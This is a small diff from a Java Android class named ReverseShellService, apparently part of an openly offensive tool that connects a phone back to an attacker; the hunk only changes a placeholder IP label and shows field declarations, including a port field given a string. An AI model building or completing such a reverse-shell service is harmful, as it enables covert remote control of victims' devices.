@@ -31,7 +31,7 @@ public class ReverseShellService extends Service {
     private static final int NOTIFICATION_ID = 1;
     private static final String LOG_FILE = "revshell_log.txt";
 
-    private String attackerIP = "Victim IP Address";
+    private String attackerIP = "Attacker IP Address";
     private int attackerPort = "Replace Port Number";
     private Socket socket;
     private PrintWriter out;
